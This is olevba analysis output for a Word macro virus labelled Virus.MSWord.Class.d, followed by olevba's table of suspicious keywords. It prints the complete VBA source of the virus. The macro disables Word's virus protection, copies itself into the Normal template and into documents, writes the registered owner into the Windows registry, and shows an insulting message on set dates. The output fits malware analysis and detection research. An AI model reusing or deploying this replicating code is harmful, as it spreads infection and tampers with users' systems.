olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-b06009080e8ade2ab294bc5ecc6865f20adab335
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-b06009080e8ade2ab294bc5ecc6865f20adab335 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
Const REG_SZ As Long = 1
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
Const HKEY_CURRENT_USER As Long = &H80000001
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
Sub AutoOpen()
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
On Error GoTo out
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
Options.VirusProtection = False
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
Options.SaveNormalPrompt = False
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
Options.ConfirmConversions = False
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
If nt > 70 And ad > 0 Then GoTo out
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
If nt < 70 Then
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
End If
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
host.codemodule.AddFromFile ("c:\class.sys")
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
With host.codemodule
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    For x = 1 To 16
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    .deletelines 1
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    Next x
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
End With
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
If nt < 70 Then
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    With host.codemodule
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    .replaceline 1, "Sub AutoClose()"
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    .replaceline 91, "Sub ToolsMacro()"
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    For x = 70 To 81
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
        .deletelines 62
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    Next x
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    .replaceline 35, "    For x = 1 To 4"
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    End With
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
End If
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
If nt < 70 Then
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
u = RegCloseKey(k)
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
End If
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
With host.codemodule
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    For x = 2 To 104 Step 2
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
    Next x
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
End With
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
out:
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
End Sub
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
Sub ViewVBCode()
'furia24/09/99 22.35.54Epson Stylus 820 on LPT1:sambrogio
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

